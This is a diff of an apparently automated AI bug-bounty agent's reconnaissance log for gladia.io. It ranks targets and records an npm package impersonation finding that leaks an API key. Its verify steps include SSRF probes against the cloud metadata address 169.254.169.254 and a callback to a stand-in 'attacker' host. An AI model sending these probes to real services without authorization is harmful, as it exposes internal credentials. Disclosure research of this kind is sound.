@@ -1,4 +1,4 @@
-## 2026-08-20 11:05:32 UTC [app] (model nemotron3)
+## 2026-08-20 11:40:16 UTC [app] (model nemotron3)
 [PRIO] npm registry (gladia@0.1.3), 79, attack=9 business=6 tech=9 gate=10 cloud=3 fresh=10
 [PRIO] app.gladia.io, 71, attack=8 business=7 tech=8 gate=10 cloud=5 fresh=1
 [PRIO] api.gladia.io, 47, attack=6 business=5 tech=5 gate=2 cloud=8 fresh=1
@@ -29,20 +29,18 @@ evidence_needed: Valid API key to test audio_url fetch to internal metadata endp
 verify_steps: AUTH_HELPED: POST /v2/pre-recorded with valid x-gladia-key + audio_url=http://169.254.169.254/latest/meta-data/; POST /v2/live with valid key + callback_url=http://attacker/; observe server-side fetch/callback
 impact: Server-side request forgery to internal metadata services + webhook delivery to arbitrary URLs; severity High (requires valid key)
 testability: AUTH_HELPED
-[PARKED] Undocumented /v2/live/health endpoint exists outside OpenAPI spec: confidence 35 < 40 threshold; properly key-gated with no data leakage; informational only, not a reportable finding class
+[PARKED] SSRF via server-side fetch of audio_url/video_url + webhook callback delivery: confidence 73 but testability AUTH_HELPED requires valid API key which is not available in this phase; downgraded to inactive lead during POC/target=app phase
+[PARKED] Post-auth open redirect via reflected redirect_to on signin form action: confidence 57, testability HUMAN_ONLY (requires Google SSO auth) — parked until authorized human test
 [FINAL]
 [HYP] Orphaned npm package impersonates official SDK and leaks raw API key in WebSocket URL query
 class: OTHER
 asset: npm registry (gladia@0.1.3)
 confidence: 96
-[HYP] SSRF via server-side fetch of audio_url/video_url + webhook callback delivery
-class: SSRF
-asset: api.gladia.io
-confidence: 73
-[HYP] Post-auth open redirect via reflected redirect_to on signin form action
-class: OATH
-asset: app.gladia.io
-confidence: 57
+reasoning: Package claims "Official TypeScript SDK for Gladia" but repo is alexisbouchez/gladia.ts (personal, GitHub 404); maintainer softwarecitadel@gmail.com; src/client.ts:306-308 embeds raw x-gladia-key into wss://api.gladia.io/v2/live query param via searchParams.append; diverges from official @gladiaio/sdk POST /v2/live → token flow; sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 verified via 7+ local npm pack; dist-tag latest=0.1.3 persists while source repo+user 404 (orphaned/irrevocable)
+evidence_needed: Confirm package still publishable/maintainable by orphaned account; verify key leakage in compiled dist
+verify_steps: RAG: npm view gladia@0.1.3 dist integrity + GitHub 404 on repo/user; local npm pack reproduces sha256 + src/client.ts key-in-URL
+impact: Supply-chain takeover risk + API key leakage in WebSocket URL (logs/proxies); severity Critical (orphaned account + key exposure)
+testability: PASSIVE
 [NEXT] HUMAN: Submit the locked gladia@0.1.3 orphaned impersonation report via https://gladia.io/bug-bounty-report (301→www→302→Google Forms, auth-gated via Google SSO)
 [LEARN] REJECTED MISCONFIG @ api.gladia.io: per-instance codegen fingerprint falsified — etag rotates via dynamic example timestamps, structural hash is stable baseline across 100+ cycles
 [LEARN] REJECTED MISCONFIG @ api.gladia.io: OpenAPI "size change" to 132834B was stale/erroneous — fresh probes confirm 125131B byte-identical
